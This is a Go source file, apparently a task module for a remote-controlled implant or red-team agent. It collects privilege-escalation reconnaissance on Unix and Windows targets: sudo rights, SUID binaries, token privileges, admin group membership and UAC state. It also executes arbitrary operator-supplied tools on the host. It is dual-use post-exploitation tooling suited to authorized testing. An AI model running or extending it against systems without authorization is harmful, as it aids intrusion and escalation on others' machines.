package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// PrivescObservation 表示一条提权辅助探测结果。
type PrivescObservation struct {
	Name    string `json:"name"`
	Status  string `json:"status"`
	Details string `json:"details"`
}

func executePrivescCheck(task Task) TaskResponse {
	var params struct {
		Keyword string `json:"keyword"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil && strings.TrimSpace(task.Parameters) != "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}

	filtered := filterPrivescObservations(collectPrivescObservations(), params.Keyword)
	if len(filtered) == 0 {
		return successTaskResponse(task.ID, "未找到匹配的提权辅助探测结果")
	}

	return successTaskResponse(task.ID, renderPrivescObservations(filtered))
}

func executePrivescTool(task Task) TaskResponse {
	var params struct {
		Path           string  `json:"path"`
		Args           string  `json:"args"`
		TimeoutSeconds float64 `json:"timeout_seconds"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}
	if strings.TrimSpace(params.Path) == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "path 不能为空", Completed: true, Status: "error: missing path"}
	}

	targetPath := expandUserPath(strings.TrimSpace(params.Path))
	if _, err := os.Stat(targetPath); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "工具不存在或不可访问: " + err.Error(), Completed: true, Status: "error: missing tool"}
	}

	timeout := 120 * time.Second
	if params.TimeoutSeconds > 0 {
		timeout = time.Duration(params.TimeoutSeconds) * time.Second
	}

	argsList := splitCommandLine(params.Args)
	cmd := exec.Command(targetPath, argsList...)
	if runtime.GOOS != "windows" {
		cmd.Env = append(os.Environ(), "TERM=xterm")
	}

	result, err := runCommandWithTimeout(cmd, timeout)
	displayName := filepath.Base(targetPath)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: fmt.Sprintf("[%s] 执行失败\n%s\n错误: %v", displayName, result, err), Completed: true, Status: "error: tool execution failed"}
	}

	return successTaskResponse(task.ID, fmt.Sprintf("[%s] 执行完成\n%s", displayName, result))
}

func collectPrivescObservations() []PrivescObservation {
	if runtime.GOOS == "windows" {
		return collectWindowsPrivescObservations()
	}
	return collectUnixPrivescObservations()
}

func collectUnixPrivescObservations() []PrivescObservation {
	observations := []PrivescObservation{{
		Name:    "当前权限",
		Status:  ternaryStatus(isElevated(), "high", "info"),
		Details: fmt.Sprintf("user=%s euid_root=%t integrity=%s", getCurrentUser(), isElevated(), getIntegrityLevel()),
	}}

	appendCommandObservation(&observations, "身份信息", "info", "id")
	appendCommandObservation(&observations, "sudo 免密检查", "high", "sudo", "-n", "-l")

	commonPaths := []string{"/usr/bin/passwd", "/usr/bin/sudo", "/usr/bin/find", "/usr/bin/vim", "/usr/bin/nmap", "/usr/bin/bash"}
	suidHits := make([]string, 0)
	for _, path := range commonPaths {
		if info, err := os.Stat(path); err == nil && info.Mode()&os.ModeSetuid != 0 {
			suidHits = append(suidHits, path)
		}
	}
	if len(suidHits) > 0 {
		observations = append(observations, PrivescObservation{Name: "常见 SUID 程序", Status: "info", Details: strings.Join(suidHits, ", ")})
	}

	if info, err := os.Stat("/etc/sudoers"); err == nil {
		observations = append(observations, PrivescObservation{Name: "sudoers 权限", Status: "info", Details: info.Mode().String()})
	}
	return observations
}

func collectWindowsPrivescObservations() []PrivescObservation {
	observations := []PrivescObservation{{
		Name:    "当前权限",
		Status:  ternaryStatus(isElevated(), "high", "info"),
		Details: fmt.Sprintf("user=%s elevated=%t integrity=%s", getCurrentUser(), isElevated(), getIntegrityLevel()),
	}}

	appendCommandObservation(&observations, "令牌组信息", "info", "whoami", "/groups")
	appendCommandObservation(&observations, "令牌权限", "info", "whoami", "/priv")
	appendCommandObservation(&observations, "本地管理员组", "info", "net", "localgroup", "Administrators")
	appendCommandObservation(&observations, "UAC 状态", "info", "reg", "query", `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System`, "/v", "EnableLUA")
	return observations
}

func ternaryStatus(condition bool, whenTrue, whenFalse string) string {
	if condition {
		return whenTrue
	}
	return whenFalse
}

func compactOutput(data []byte) string {
	text := strings.TrimSpace(string(data))
	lines := strings.Split(text, "\n")
	trimmed := make([]string, 0, len(lines))
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			trimmed = append(trimmed, line)
		}
		if len(trimmed) >= 6 {
			break
		}
	}
	return strings.Join(trimmed, " | ")
}

func appendCommandObservation(observations *[]PrivescObservation, name string, successStatus string, command string, args ...string) {
	output, err := exec.Command(command, args...).CombinedOutput()
	if err == nil {
		*observations = append(*observations, PrivescObservation{Name: name, Status: successStatus, Details: compactOutput(output)})
		return
	}
	if len(output) > 0 {
		*observations = append(*observations, PrivescObservation{Name: name, Status: "info", Details: compactOutput(output)})
	}
}

func filterPrivescObservations(observations []PrivescObservation, keyword string) []PrivescObservation {
	needle := strings.ToLower(strings.TrimSpace(keyword))
	if needle == "" {
		return observations
	}
	filtered := make([]PrivescObservation, 0, len(observations))
	for _, observation := range observations {
		if strings.Contains(strings.ToLower(observation.Name), needle) || strings.Contains(strings.ToLower(observation.Details), needle) {
			filtered = append(filtered, observation)
		}
	}
	return filtered
}

func renderPrivescObservations(observations []PrivescObservation) string {
	var output strings.Builder
	output.WriteString("辅助提权环境探测结果：\n")
	for _, observation := range observations {
		output.WriteString(fmt.Sprintf("- [%s] %s: %s\n", observation.Status, observation.Name, observation.Details))
	}
	output.WriteString("\n说明：该命令仅用于环境探测和辅助判断，不直接执行提权利用。")
	return output.String()
}

func successTaskResponse(taskID string, output string) TaskResponse {
	return TaskResponse{
		TaskID:     taskID,
		UserOutput: output,
		Completed:  true,
		Status:     "success",
	}
}

func expandUserPath(path string) string {
	if path == "" || path[0] != '~' {
		return path
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return path
	}
	if path == "~" {
		return home
	}
	return filepath.Join(home, strings.TrimPrefix(path, "~/"))
}

// splitCommandLine 只做简单参数切分，满足本地辅助工具调用场景。
func splitCommandLine(input string) []string {
	if strings.TrimSpace(input) == "" {
		return nil
	}
	return strings.Fields(input)
}

func runCommandWithTimeout(cmd *exec.Cmd, timeout time.Duration) (string, error) {
	type result struct {
		output []byte
		err    error
	}

	done := make(chan result, 1)
	go func() {
		output, err := cmd.CombinedOutput()
		done <- result{output: output, err: err}
	}()

	select {
	case res := <-done:
		return string(res.output), res.err
	case <-time.After(timeout):
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		return "", fmt.Errorf("执行超时（%s）", timeout)
	}
}
